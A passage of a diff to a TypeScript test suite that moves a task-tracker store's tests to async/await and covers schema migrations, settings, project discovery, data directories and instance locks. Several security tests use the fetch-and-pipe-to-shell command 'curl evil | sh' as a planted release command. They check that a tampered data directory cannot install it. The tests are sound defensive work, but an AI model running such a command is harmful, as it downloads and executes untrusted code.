+		const retro = await store.createTask("a retro");
+		await store.updateTask(retro.id, { followUpOf: source.id, stage: "done" });
+		const held = await store.createTask("a held proposal");
+		await store.updateTask(held.id, {
 			followUpOf: retro.id,
 			state: "needs_you",
 			needsReason:
 				"Proposed by the retro of the pinned session name. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		});
 		// A legacy retro proposal whose retro has no parent names the retro itself.
-		const loneRetro = store.createTask("an orphan retro");
-		const loneHeld = store.createTask("another held proposal");
-		store.updateTask(loneHeld.id, {
+		const loneRetro = await store.createTask("an orphan retro");
+		const loneHeld = await store.createTask("another held proposal");
+		await store.updateTask(loneHeld.id, {
 			followUpOf: loneRetro.id,
 			state: "needs_you",
 			needsReason:
 				"Proposed by the retro of an orphan retro. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		});
 		// A legacy fork proposal names the result card one hop up.
-		const forkCard = store.createTask("fork research");
-		const forkHeld = store.createTask("a fork proposal");
-		store.updateTask(forkHeld.id, {
+		const forkCard = await store.createTask("fork research");
+		const forkHeld = await store.createTask("a fork proposal");
+		await store.updateTask(forkHeld.id, {
 			followUpOf: forkCard.id,
 			state: "needs_you",
 			needsReason:
 				"Proposed by the fork research the repo. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		});
 		// The 2026-11 wording already carries the id: only the quoted title drops.
-		const quoted = store.createTask("a quoted proposal");
-		store.updateTask(quoted.id, {
+		const quoted = await store.createTask("a quoted proposal");
+		await store.updateTask(quoted.id, {
 			followUpOf: loneRetro.id,
 			state: "needs_you",
 			needsReason:
 				'Retro proposal from t9 ("the widget"). Accept starts it. Edit task changes the prompt first. Cancel task declines it.',
 		});
-		store.close();
+		await store.close();
 
-		const reopened = open(join(root, "proposal-reason-id"));
-		expect(reopened.getTask(held.id)!.needsReason).toBe(
+		const reopened = await open(join(root, "proposal-reason-id"));
+		expect((await reopened.getTask(held.id))!.needsReason).toBe(
 			`Retro proposal from ${source.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
 		);
-		expect(reopened.getTask(loneHeld.id)!.needsReason).toBe(
+		expect((await reopened.getTask(loneHeld.id))!.needsReason).toBe(
 			`Retro proposal from ${loneRetro.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
 		);
-		expect(reopened.getTask(forkHeld.id)!.needsReason).toBe(
+		expect((await reopened.getTask(forkHeld.id))!.needsReason).toBe(
 			`Fork proposal from ${forkCard.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
 		);
-		expect(reopened.getTask(quoted.id)!.needsReason).toBe(
+		expect((await reopened.getTask(quoted.id))!.needsReason).toBe(
 			"Retro proposal from t9. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		);
-		reopened.close();
+		await reopened.close();
 
 		// Idempotent: the id-only text survives another open unchanged.
-		const again = open(join(root, "proposal-reason-id"));
-		expect(again.getTask(held.id)!.needsReason).toBe(
+		const again = await open(join(root, "proposal-reason-id"));
+		expect((await again.getTask(held.id))!.needsReason).toBe(
 			`Retro proposal from ${source.id}. Accept starts it. Edit task changes the prompt first. Cancel task declines it.`,
 		);
-		expect(again.getTask(quoted.id)!.needsReason).toBe(
+		expect((await again.getTask(quoted.id))!.needsReason).toBe(
 			"Retro proposal from t9. Accept starts it. Edit task changes the prompt first. Cancel task declines it.",
 		);
-		again.close();
+		await again.close();
 	});
 
-	test("fresh databases: new tasks carry a null topic and updateTask can set it", () => {
-		const store = open(join(root, "topic-fresh"));
-		const task = store.createTask("brand new");
+	test("fresh databases: new tasks carry a null topic and updateTask can set it", async () => {
+		const store = await open(join(root, "topic-fresh"));
+		const task = await store.createTask("brand new");
 		// toBeNull fails on undefined: proves the field is present, not just falsy.
 		expect(task.topic).toBeNull();
-		expect(store.updateTask(task.id, { topic: "auth" }).topic).toBe("auth");
-		expect(store.updateTask(task.id, { topic: null }).topic).toBeNull();
-		store.close();
+		expect((await store.updateTask(task.id, { topic: "auth" })).topic).toBe(
+			"auth",
+		);
+		expect((await store.updateTask(task.id, { topic: null })).topic).toBeNull();
+		await store.close();
 	});
 
-	test("an older database without shots converges on open and persists task shots", () => {
+	test("an older database without shots converges on open and persists task shots", async () => {
 		const dir = join(root, "shots-migration");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2661,22 +2899,22 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		expect(store.getTask("seed1")?.shots).toEqual([]);
-		const task = store.createTask("after migration");
-		expect(store.updateTask(task.id, { shots: ["1.png"] }).shots).toEqual([
-			"1.png",
-		]);
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("seed1"))?.shots).toEqual([]);
+		const task = await store.createTask("after migration");
+		expect(
+			(await store.updateTask(task.id, { shots: ["1.png"] })).shots,
+		).toEqual(["1.png"]);
+		await store.close();
 
-		const reopened = open(dir);
-		expect(reopened.getTask(task.id)?.shots).toEqual(["1.png"]);
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask(task.id))?.shots).toEqual(["1.png"]);
+		await reopened.close();
 	});
 
 	// Regression for R4-4: one open must converge the oldest shapes to the current schema.
 	// Deleting any ALTER in ProjectStore.open makes a write here fail with "no such column".
-	test("a legacy database converges: every current column exists, is writable, and survives a reopen", () => {
+	test("a legacy database converges: every current column exists, is writable, and survives a reopen", async () => {
 		const dir = join(root, "legacy-convergence");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -2702,31 +2940,31 @@ describe("preparing migration", () => {
 		);
 		db.close();
 
-		const store = open(dir);
-		store.updateTask("leg1", { pushSha: "abc", dependsOn: ["x"] });
-		store.startTurn("leg1", "work", "legacy turn", null, "turn input");
-		store.finishTurn(store.listTurns("leg1")[0]!.id, {
+		const store = await open(dir);
+		await store.updateTask("leg1", { pushSha: "abc", dependsOn: ["x"] });
+		await store.startTurn("leg1", "work", "legacy turn", null, "turn input");
+		await store.finishTurn((await store.listTurns("leg1"))[0]!.id, {
 			model: "glm",
 			ranOn: "worker-a (abc)",
 		});
-		store.close();
+		await store.close();
 
-		const reopened = open(dir);
-		expect(reopened.getTask("leg1")?.pushSha).toBe("abc");
-		expect(reopened.getTask("leg1")?.dependsOn).toEqual(["x"]);
-		expect(reopened.listTurns("leg1")[0]?.model).toBe("glm");
-		expect(reopened.listTurns("leg1")[0]?.ranOn).toBe("worker-a (abc)");
-		expect(reopened.listTurns("leg1")[0]?.input).toBe("turn input");
-		reopened.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask("leg1"))?.pushSha).toBe("abc");
+		expect((await reopened.getTask("leg1"))?.dependsOn).toEqual(["x"]);
+		expect((await reopened.listTurns("leg1"))[0]?.model).toBe("glm");
+		expect((await reopened.listTurns("leg1"))[0]?.ranOn).toBe("worker-a (abc)");
+		expect((await reopened.listTurns("leg1"))[0]?.input).toBe("turn input");
+		await reopened.close();
 
 		// Column convergence: the upgraded schema must match a fresh schema exactly.
 		// A new Task/Turn field lands in both automatically; a missing live migration fails here.
 		const probe = new Database(join(dir, ".tasks", "tasks.db"));
-		const fresh = open(join(root, "migration-fresh"));
+		const fresh = await open(join(root, "migration-fresh"));
 		const freshDb = new Database(
 			join(root, "migration-fresh", ".tasks", "tasks.db"),
 		);
-		fresh.close();
+		await fresh.close();
 		for (const table of ["tasks", "turns"]) {
 			const cols = (db: Database) =>
 				db
@@ -2742,11 +2980,11 @@ describe("preparing migration", () => {
 });
 
 describe("discoverProjects", () => {
-	test("extra paths outside the roots are found; dups collapse; missing dirs skip", () => {
+	test("extra paths outside the roots are found; dups collapse; missing dirs skip", async () => {
 		const rootA = join(root, "disc-root");
 		const inRoot = join(rootA, "inside");
 		const outside = join(root, "disc-outside");
-		for (const dir of [inRoot, outside]) open(dir);
+		for (const dir of [inRoot, outside]) await open(dir);
 		mkdirSync(join(root, "disc-empty"), { recursive: true });
 		const found = discoverProjects(
 			[rootA],
@@ -2760,11 +2998,11 @@ describe("discoverProjects", () => {
 
 	// Regression for R4-3: the board keys projects (and their OTTR_DATA_DIR data dirs) by
 	// basename, so discovery must never return two paths with the same folder name.
-	test("a basename collision keeps one path; the explicit extra path wins", () => {
+	test("a basename collision keeps one path; the explicit extra path wins", async () => {
 		const rootA = join(root, "collide-a", "app");
 		const rootB = join(root, "collide-b", "app");
 		const explicit = join(root, "collide-extra", "app");
-		for (const dir of [rootA, rootB, explicit]) open(dir);
+		for (const dir of [rootA, rootB, explicit]) await open(dir);
 		expect(
 			discoverProjects(
 				[join(root, "collide-a"), join(root, "collide-b")],
@@ -2779,10 +3017,10 @@ describe("discoverProjects", () => {
 
 	// Regression: a removed project must drop out before the basename dedupe, or it claims
 	// the folder name and hides a wanted same-name project in another root.
-	test("a removed path cannot mask a wanted duplicate elsewhere", () => {
+	test("a removed path cannot mask a wanted duplicate elsewhere", async () => {
 		const rootA = join(root, "mask-a", "app");
 		const rootB = join(root, "mask-b", "app");
-		for (const dir of [rootA, rootB]) open(dir);
+		for (const dir of [rootA, rootB]) await open(dir);
 		expect(
 			discoverProjects(
 				[join(root, "mask-a"), join(root, "mask-b")],
@@ -2794,7 +3032,7 @@ describe("discoverProjects", () => {
 });
 
 describe("OTTR_DATA_DIR", () => {
-	test("task data lives in the data dir, where discovery and a reopen find it", () => {
+	test("task data lives in the data dir, where discovery and a reopen find it", async () => {
 		const data = join(root, "data-dir");
 		const parent = join(root, "data-root");
 		const proj = join(parent, "proj");
@@ -2802,19 +3040,19 @@ describe("OTTR_DATA_DIR", () => {
 		const saved = process.env.OTTR_DATA_DIR;
 		process.env.OTTR_DATA_DIR = data;
 		try {
-			const store = ProjectStore.init(proj);
+			const store = await ProjectStore.init(proj);
 			opened.push(store);
-			const t = store.createTask("kept outside the checkout");
+			const t = await store.createTask("kept outside the checkout");
 			expect(existsSync(join(data, "proj", "tasks.db"))).toBe(true);
-			expect(store.logPath(t.id)).toBe(
+			expect(await store.logPath(t.id)).toBe(
 				join(data, "proj", "logs", `${t.id}.log`),
 			);
 			expect(store.sessionsDir).toBe(join(data, "proj", "sessions"));
 			expect(existsSync(join(proj, ".tasks"))).toBe(false);
 			expect(existsSync(join(proj, ".worktrees"))).toBe(true); // worktrees stay in the clone
 			expect(discoverProjects([parent])).toEqual([proj]);
-			store.close();
-			expect(open(proj).getTask(t.id)?.prompt).toBe(
+			await store.close();
+			expect((await (await open(proj)).getTask(t.id))?.prompt).toBe(
 				"kept outside the checkout",
 			);
 		} finally {
@@ -2828,17 +3066,17 @@ describe("OTTR_DATA_DIR", () => {
 
 describe("OTTR_SERVER_DATA_DIR", () => {
 	/** Runs `fn` with both dirs set (`server` undefined: unset), then restores the env. */
-	const withDirs = <T>(
+	const withDirs = async <T>(
 		data: string,
 		server: string | undefined,
-		fn: () => T,
-	): T => {
+		fn: () => T | Promise<T>,
+	): Promise<T> => {
 		const saved = [process.env.OTTR_DATA_DIR, process.env.OTTR_SERVER_DATA_DIR];
 		process.env.OTTR_DATA_DIR = data;
 		if (server === undefined) delete process.env.OTTR_SERVER_DATA_DIR;
 		else process.env.OTTR_SERVER_DATA_DIR = server;
 		try {
-			return fn();
+			return await fn();
 		} finally {
 			if (saved[0] === undefined) delete process.env.OTTR_DATA_DIR;
 			else process.env.OTTR_DATA_DIR = saved[0];
@@ -2847,51 +3085,53 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 		}
 	};
 	/** A valid tracker DB at `<data>/<name>/tasks.db`, as an older board (or a worker) leaves it. */
-	const legacyDb = (data: string, proj: string, releaseCommand: string) =>
-		withDirs(data, undefined, () => {
-			const store = ProjectStore.open(proj);
-			store.createTask("legacy task");
-			store.setSettings({ releaseCommand });
-			store.close();
+	const legacyDb = async (data: string, proj: string, releaseCommand: string) =>
+		await withDirs(data, undefined, async () => {
+			const store = await ProjectStore.open(proj);
+			await store.createTask("legacy task");
+			await store.setSettings({ releaseCommand });
+			await store.close();
 		});
 
-	test("tasks.db lives in the server dir; logs and sessions stay in the data dir", () => {
+	test("tasks.db lives in the server dir; logs and sessions stay in the data dir", async () => {
 		const base = join(root, "server-dir-layout");
 		const data = join(base, "data");
 		const server = join(base, "server");
 		const parent = join(base, "checkouts");
 		const proj = join(parent, "proj");
 		mkdirSync(proj, { recursive: true });
-		withDirs(data, server, () => {
-			const store = ProjectStore.init(proj);
+		await withDirs(data, server, async () => {
+			const store = await ProjectStore.init(proj);
 			opened.push(store);
-			const t = store.createTask("trusted state");
+			const t = await store.createTask("trusted state");
 			expect(store.serverDir).toBe(join(server, "proj"));
 			expect(existsSync(join(server, "proj", "tasks.db"))).toBe(true);
 			expect(existsSync(join(data, "proj", "tasks.db"))).toBe(false);
-			expect(store.logPath(t.id)).toBe(
+			expect(await store.logPath(t.id)).toBe(
 				join(data, "proj", "logs", `${t.id}.log`),
 			);
 			expect(store.sessionsDir).toBe(join(data, "proj", "sessions"));
 			expect(discoverProjects([parent])).toEqual([proj]);
-			store.close();
-			expect(open(proj).getTask(t.id)?.prompt).toBe("trusted state");
+			await store.close();
+			expect((await (await open(proj)).getTask(t.id))?.prompt).toBe(
+				"trusted state",
+			);
 		});
 	});
 
-	test("a worker rewriting the data dir cannot change releaseCommand", () => {
+	test("a worker rewriting the data dir cannot change releaseCommand", async () => {
 		const base = join(root, "server-dir-worker");
 		const data = join(base, "data");
 		const server = join(base, "server");
 		const proj = join(base, "checkouts", "proj");
 		mkdirSync(proj, { recursive: true });
-		withDirs(data, server, () => {
-			const store = ProjectStore.init(proj);
-			store.setSettings({ releaseCommand: "bun run release" });
-			store.close();
+		await withDirs(data, server, async () => {
+			const store = await ProjectStore.init(proj);
+			await store.setSettings({ releaseCommand: "bun run release" });
+			await store.close();
 		});
 		// The worker plants a valid tracker DB and overwrites everything else it can reach.
-		legacyDb(data, proj, "curl evil | sh");
+		await legacyDb(data, proj, "curl evil | sh");
 		for (const entry of readdirSync(data, {
 			recursive: true,
 			withFileTypes: true,
@@ -2899,32 +3139,34 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 			if (entry.isFile() && entry.name !== "tasks.db")
 				writeFileSync(join(entry.parentPath, entry.name), "junk");
 		}
-		withDirs(data, server, () => {
-			expect(open(proj).getSettings().releaseCommand).toBe("bun run release");
+		await withDirs(data, server, async () => {
+			expect((await (await open(proj)).getSettings()).releaseCommand).toBe(
+				"bun run release",
+			);
 		});
 	});
 
-	test("a tasks.db planted in the data dir makes no project", () => {
+	test("a tasks.db planted in the data dir makes no project", async () => {
 		const base = join(root, "server-dir-plant");
 		const data = join(base, "data");
 		const server = join(base, "server");
 		const parent = join(base, "checkouts");
 		const evil = join(parent, "evil");
 		mkdirSync(evil, { recursive: true });
-		legacyDb(data, evil, "curl evil | sh");
+		await legacyDb(data, evil, "curl evil | sh");
 		expect(existsSync(join(data, "evil", "tasks.db"))).toBe(true);
-		withDirs(data, server, () => {
+		await withDirs(data, server, async () => {
 			expect(discoverProjects([parent])).toEqual([]);
 		});
 	});
 
-	test("adoption moves a legacy DB once and ignores later plants", () => {
+	test("adoption moves a legacy DB once and ignores later plants", async () => {
 		const base = join(root, "server-dir-adopt");
 		const data = join(base, "data");
 		const server = join(base, "server");
 		const proj = join(base, "checkouts", "proj");
 		mkdirSync(proj, { recursive: true });
-		legacyDb(data, proj, "bun run release");
+		await legacyDb(data, proj, "bun run release");
 		expect(adoptSharedProjectData(data, server)).toEqual([
 			{ name: "proj", status: "adopted" },
 		]);
@@ -2933,25 +3175,33 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 			true,
 		);
 		expect(existsSync(join(server, ".adopted"))).toBe(true);
-		withDirs(data, server, () => {
-			const store = open(proj);
-			expect(store.listTasks().map((t) => t.prompt)).toEqual(["legacy task"]);
-			expect(store.getSettings().releaseCommand).toBe("bun run release");
-			store.close();
+		await withDirs(data, server, async () => {
+			const store = await open(proj);
+			expect((await store.listTasks()).map((t) => t.prompt)).toEqual([
+				"legacy task",
+			]);
+			expect((await store.getSettings()).releaseCommand).toBe(
+				"bun run release",
+			);
+			await store.close();
 		});
-		legacyDb(data, join(base, "checkouts", "other"), "curl evil | sh");
+		await legacyDb(data, join(base, "checkouts", "other"), "curl evil | sh");
 		expect(adoptSharedProjectData(data, server)).toEqual([]);
 		expect(existsSync(join(server, "other", "tasks.db"))).toBe(false);
 	});
 
 	test.skipIf(process.platform === "win32")(
 		"adoption skips symlinked dirs and reports a corrupt DB without stopping",
-		() => {
+		async () => {
 			const base = join(root, "server-dir-adopt-mixed");
 			const data = join(base, "data");
 			const server = join(base, "server");
 			const outside = join(base, "outside");
-			legacyDb(outside, join(base, "checkouts", "linked"), "curl evil | sh");
+			await legacyDb(
+				outside,
+				join(base, "checkouts", "linked"),
+				"curl evil | sh",
+			);
 			mkdirSync(data, { recursive: true });
 			symlinkSync(join(outside, "linked"), join(data, "linked"));
 			mkdirSync(join(data, "broken"), { recursive: true });
@@ -2959,7 +3209,7 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 				join(data, "broken", "tasks.db"),
 				"not a sqlite file at all",
 			);
-			legacyDb(data, join(base, "checkouts", "good"), "bun run release");
+			await legacyDb(data, join(base, "checkouts", "good"), "bun run release");
 			const results = adoptSharedProjectData(data, server).sort((a, b) =>
 				a.name.localeCompare(b.name),
 			);
@@ -2977,18 +3227,18 @@ describe("OTTR_SERVER_DATA_DIR", () => {
 });
 
 describe("release notes persistence", () => {
-	test("edited release notes survive a store reopen", () => {
+	test("edited release notes survive a store reopen", async () => {
 		const dir = join(root, "release-notes-reopen");
-		const store = open(dir);
-		const t = store.createTask("release me");
-		store.updateTask(t.id, {
+		const store = await open(dir);
+		const t = await store.createTask("release me");
+		await store.updateTask(t.id, {
 			releaseNotes: "persist me",
 			releaseVersion: "v1.0.0",
 		});
-		store.close();
-		const reopened = open(dir);
-		expect(reopened.getTask(t.id)!.releaseNotes).toBe("persist me");
-		reopened.close();
+		await store.close();
+		const reopened = await open(dir);
+		expect((await reopened.getTask(t.id))!.releaseNotes).toBe("persist me");
+		await reopened.close();
 	});
 });
 
@@ -3002,7 +3252,7 @@ describe("instance lock", () => {
 				"bun",
 				"-e",
 				`import { ProjectStore } from ${JSON.stringify(join(import.meta.dir, "store.ts"))};
-				 ProjectStore.open(process.env.LOCK_DIR);
+				 await ProjectStore.open(process.env.LOCK_DIR);
 				 await Bun.write(process.env.READY_FILE, "1");
 				 await new Promise(() => {});`,
 			],
@@ -3041,7 +3291,7 @@ describe("instance lock", () => {
 		try {
 			let err: unknown;
 			try {
-				ProjectStore.open(dir);
+				await ProjectStore.open(dir);
 			} catch (e) {
 				err = e;
 			}
@@ -3060,9 +3310,9 @@ describe("instance lock", () => {
 		const child = await spawnHolder(dir);
 		child.kill(9); // no clean close: no release code runs, the OS drops the lock
 		await child.exited;
-		const second = open(dir); // whatever pid or hostname the dead holder named
-		expect(second.listTasks()).toEqual([]);
-		second.close();
+		const second = await open(dir); // whatever pid or hostname the dead holder named
+		expect(await second.listTasks()).toEqual([]);
+		await second.close();
 	});
 });
 
@@ -3075,7 +3325,7 @@ describe("arch-review changed-line coverage", () => {
 	};
 
 	describe("discoverProjects", () => {
-		test("duplicate basenames keep the first root hit; a missing tasks.db is skipped; results are sorted", () => {
+		test("duplicate basenames keep the first root hit; a missing tasks.db is skipped; results are sorted", async () => {
 			const rootA = join(root, "ar-disc-a");
 			const rootB = join(root, "ar-disc-b");
 			mkdirSync(rootA, { recursive: true });
@@ -3091,7 +3341,7 @@ describe("arch-review changed-line coverage", () => {
 			]);
 		});
 
-		test("an explicit extra path shadows a root hit with the same basename", () => {
+		test("an explicit extra path shadows a root hit with the same basename", async () => {
 			const rootA = join(root, "ar-shadow-root");
 			const explicit = join(root, "ar-shadow-explicit", "app");
 			mkdirSync(rootA, { recursive: true });
@@ -3100,7 +3350,7 @@ describe("arch-review changed-line coverage", () => {
 			expect(discoverProjects([rootA], [explicit])).toEqual([explicit]);
 		});
 
-		test("a removed path drops out before dedupe, even an explicit extra", () => {
+		test("a removed path drops out before dedupe, even an explicit extra", async () => {
 			const rootA = join(root, "ar-removed-root");
 			const rootB = join(root, "ar-removed-root2");
 			mkdirSync(rootA, { recursive: true });
@@ -3121,7 +3371,7 @@ describe("arch-review changed-line coverage", () => {
 			expect(discoverProjects([rootA], [kept], [goneA])).toEqual([kept]);
 		});
 
-		test("a missing or unreadable root is skipped", () => {
+		test("a missing or unreadable root is skipped", async () => {
 			const rootA = join(root, "ar-skip-root");
 			const p = fakeProject(join(rootA, "only"));
 			expect(
@@ -3138,94 +3388,94 @@ describe("arch-review changed-line coverage", () => {
 			return db;
 		};
 
-		test("stored values of the wrong shape keep the default", () => {
+		test("stored values of the wrong shape keep the default", async () => {
 			const dir = join(root, "ar-shape");
-			const store = open(dir);
-			store.close();
+			const store = await open(dir);
+			await store.close();
 			const db = rawDb(dir);
 			// number key holding a JSON string; string[] key holding an object
 			db.run(
 				"INSERT INTO settings (key, value) VALUES ('maxParallel', '\"5\"'), ('copyExtra', '{\"a\":1}'), ('autoTend', 'yes'), ('noSuchKey', '1')",
 			);
 			db.close();
-			const store2 = open(dir);
-			const s = store2.getSettings();
+			const store2 = await open(dir);
+			const s = await store2.getSettings();
 			expect(s.maxParallel).toBe(DEFAULT_SETTINGS.maxParallel);
 			expect(s.copyExtra).toEqual([]);
 			expect(s.autoTend).toBe(DEFAULT_SETTINGS.autoTend);
 			// An unknown settings key must not leak its stored value into the result.
 			expect("noSuchKey" in s).toBe(false);
-			store2.close();
+			await store2.close();
 		});
 
-		test("a null maxParallel round-trips as no cap", () => {
+		test("a null maxParallel round-trips as no cap", async () => {
 			const dir = join(root, "ar-null-parallel");
-			const store = open(dir);
-			store.setSettings({ maxParallel: null });
-			expect(store.getSettings().maxParallel).toBeNull();
-			store.close();
-			const store2 = open(dir);
-			expect(store2.getSettings().maxParallel).toBeNull();
-			store2.close();
+			const store = await open(dir);
+			await store.setSettings({ maxParallel: null });
+			expect((await store.getSettings()).maxParallel).toBeNull();
+			await store.close();
+			const store2 = await open(dir);
+			expect((await store2.getSettings()).maxParallel).toBeNull();
+			await store2.close();
 		});
 
-		test("string[] values map entries through String()", () => {
+		test("string[] values map entries through String()", async () => {
 			const dir = join(root, "ar-stringmap");
-			const store = open(dir);
-			store.close();
+			const store = await open(dir);
+			await store.close();
 			const db = rawDb(dir);
 			db.run(
 				"INSERT INTO settings (key, value) VALUES ('copyExtra', '[\"a\", 2, null, true]')",
 			);
 			db.close();
-			const store2 = open(dir);
-			expect(store2.getSettings().copyExtra).toEqual([
+			const store2 = await open(dir);
+			expect((await store2.getSettings()).copyExtra).toEqual([
 				"a",
 				"2",
 				"null",
 				"true",
 			]);
-			store2.close();
+			await store2.close();
 		});
 
-		test("corrupt JSON on a number key keeps that key's default only", () => {
+		test("corrupt JSON on a number key keeps that key's default only", async () => {
 			const dir = join(root, "ar-corrupt-num");
-			let store = open(dir);
-			store.setSettings({ maxParallel: 4, keptWorktreeDays: 2 });
-			store.close();
+			let store = await open(dir);
+			await store.setSettings({ maxParallel: 4, keptWorktreeDays: 2 });
+			await store.close();
 			const db = rawDb(dir);
 			db.run("UPDATE settings SET value = '{oops' WHERE key = 'maxParallel'");
 			db.close();
-			store = open(dir);
-			const s = store.getSettings();
+			store = await open(dir);
+			const s = await store.getSettings();
 			expect(s.maxParallel).toBe(DEFAULT_SETTINGS.maxParallel);
 			expect(s.keptWorktreeDays).toBe(2);
-			store.close();
+			await store.close();
 		});
 
-		test("returned settings are a deep copy: mutating them touches neither the defaults nor a later read", () => {
-			const store = open(join(root, "ar-deepcopy"));
-			const first = store.getSettings();
+		test("returned settings are a deep copy: mutating them touches neither the defaults nor a later read", async () => {
+			const store = await open(join(root, "ar-deepcopy"));
+			const first = await store.getSettings();
 			first.copyExtra.push(".env");
 			first.tendChurnGlobs.push("**/*");
 			expect(DEFAULT_SETTINGS.copyExtra).toEqual([]);
 			expect(DEFAULT_SETTINGS.tendChurnGlobs).toEqual([]);
-			const second = store.getSettings();
+			const second = await store.getSettings();
 			expect(second.copyExtra).toEqual([]);
 			expect(second.tendChurnGlobs).toEqual([]);
-			store.close();
+			await store.close();
 		});
 
-		test("a reset stores JSON null and unknown patch keys are ignored; the return equals getSettings()", () => {
+		test("a reset stores JSON null and unknown patch keys are ignored; the return equals getSettings()", async () => {
 			const dir = join(root, "ar-reset-null");
-			const store = open(dir);
-			store.setSettings({ displayName: "X", maxParallel: 3 });
-			const returned = store.setSettings({
+			const store = await open(dir);
+			await store.setSettings({ displayName: "X", maxParallel: 3 });
+			const returned = await store.setSettings({
 				displayName: null,
 				noSuchKey: 99,
 			} as unknown as { displayName: string | null });
-			expect(returned).toEqual(store.getSettings());
-			store.close();
+			expect(returned).toEqual(await store.getSettings());
+			await store.close();
 			// Raw reads need the store closed: the board opens its DBs in exclusive locking mode.
 			const db = rawDb(dir);
 			expect(
@@ -3244,29 +3494,29 @@ describe("arch-review changed-line coverage", () => {
 					.get()?.n,
 			).toBe(0);
 			db.close();
-			const reopened = open(dir);
-			expect(reopened.getSettings().displayName).toBeNull();
-			expect(reopened.getSettings().maxParallel).toBe(3);
-			reopened.close();
+			const reopened = await open(dir);
+			expect((await reopened.getSettings()).displayName).toBeNull();
+			expect((await reopened.getSettings()).maxParallel).toBe(3);
+			await reopened.close();
 		});
 	});
 
 	describe("task patch mapping", () => {
-		test("createTask returns exactly the stored row", () => {
-			const store = open(join(root, "ar-create-readback"));
-			const task = store.createTask("first line\nsecond line", "m/x");
-			expect(task).toEqual(store.getTask(task.id)!);
+		test("createTask returns exactly the stored row", async () => {
+			const store = await open(join(root, "ar-create-readback"));
+			const task = await store.createTask("first line\nsecond line", "m/x");
+			expect(task).toEqual((await store.getTask(task.id))!);
 			expect(task.title).toBe("first line");
-			store.close();
+			await store.close();
 		});
 
-		test("updateTask maps patch keys to columns, serializes arrays as JSON, and bumps updated_at", () => {
+		test("updateTask maps patch keys to columns, serializes arrays as JSON, and bumps updated_at", async () => {
 			const dir = join(root, "ar-patch-cols");
-			const store = open(dir);
-			const task = store.createTask("patch me");
-			const before = store.getTask(task.id)!;
+			const store = await open(dir);
+			const task = await store.createTask("patch me");
+			const before = (await store.getTask(task.id))!;
 			while (Date.now() <= before.updatedAt) {}
-			store.updateTask(task.id, {
+			await store.updateTask(task.id, {
 				needsReason: "why",
 				pendingPrompt: "later",
 				sessionId: "sess-1",
@@ -3276,7 +3526,7 @@ describe("arch-review changed-line coverage", () => {
 				asked: [],
 				releaseVersion: "v9",
 			});
-			const after = store.getTask(task.id)!;
+			const after = (await store.getTask(task.id))!;
 			expect(after.needsReason).toBe("why");
 			expect(after.pendingPrompt).toBe("later");
 			expect(after.sessionId).toBe("sess-1");
@@ -3286,7 +3536,7 @@ describe("arch-review changed-line coverage", () => {
 			expect(after.asked).toBeNull(); // empty list normalizes to null
 			expect(after.releaseVersion).toBe("v9");
 			expect(after.updatedAt).toBeGreaterThan(before.updatedAt);
-			store.close();
+			await store.close();
 			// Raw reads need the store closed: the board opens its DBs in exclusive locking mode.
 			const raw = new Database(join(dir, ".tasks", "tasks.db"));
 			const row = raw
@@ -3299,32 +3549,38 @@ describe("arch-review changed-line coverage", () => {
 			expect(row?.session_id).toBe("sess-1");
 		});
 
-		test("updateTask with undefined-keyed patch fields skips their columns", () => {
+		test("updateTask with undefined-keyed patch fields skips their columns", async () => {
 			const dir = join(root, "ar-patch-undef");
-			const store = open(dir);
-			const task = store.createTask("untouched");
-			store.updateTask(task.id, {
+			const store = await open(dir);
+			const task = await store.createTask("untouched");
+			await store.updateTask(task.id, {
 				title: undefined,
 				branch: undefined,
 			} as unknown as { title?: string; branch?: string });
-			const after = store.getTask(task.id)!;
+			const after = (await store.getTask(task.id))!;
 			expect(after.title).toBe("untouched");
 			expect(after.branch).toBeNull();
-			store.close();
+			await store.close();
 		});
 	});
 
 	describe("turn lifecycle", () => {
-		test("finishTurn maps patch keys, skips undefined ones, and records error events except for a cancelled turn", () => {
+		test("finishTurn maps patch keys, skips undefined ones, and records error events except for a cancelled turn", async () => {
 			const dir = join(root, "ar-finish-turn");
-			const store = open(dir);
-			const task = store.createTask("turns");
-			const turn = store.startTurn(task.id, "work", "prompt text", 111, "in");
-			expect(turn).toEqual(store.listTurns(task.id)[0]!);
+			const store = await open(dir);
+			const task = await store.createTask("turns");
+			const turn = await store.startTurn(
+				task.id,
+				"work",
+				"prompt text",
+				111,
+				"in",
+			);
+			expect(turn).toEqual((await store.listTurns(task.id))[0]!);
 			expect(turn.input).toBe("in");
 			expect(turn.endedAt).toBeNull();
 
-			const ended = store.finishTurn(turn.id, {
+			const ended = await store.finishTurn(turn.id, {
 				endedAt: 12345,
 				exitCode: 3,
 				outcome: "ready",
@@ -3335,7 +3591,7 @@ describe("arch-review changed-line coverage", () => {
 				pid: null,
 				question: null,
 			});
-			expect(ended).toEqual(store.listTurns(task.id)[0]!);
+			expect(ended).toEqual((await store.listTurns(task.id))[0]!);
 			expect(ended.endedAt).toBe(12345);
 			expect(ended.exitCode).toBe(3);
 			expect(ended.outcome).toBe("ready");
@@ -3345,55 +3601,63 @@ describe("arch-review changed-line coverage", () => {
 			expect(ended.model).toBe("m1");
 			expect(ended.pid).toBeNull();
 			// The failed turn logged exactly one error event with its detail.
-			const errors = store.events().filter((e) => e.kind === "error");
+			const errors = (await store.events()).filter((e) => e.kind === "error");
 			expect(errors).toHaveLength(1);
 			expect(errors[0]!.taskId).toBe(task.id);
 			expect(errors[0]!.detail).toBe("boom");
 
 			// A deliberate Cancel is not an error event; an empty patch still reads the row back.
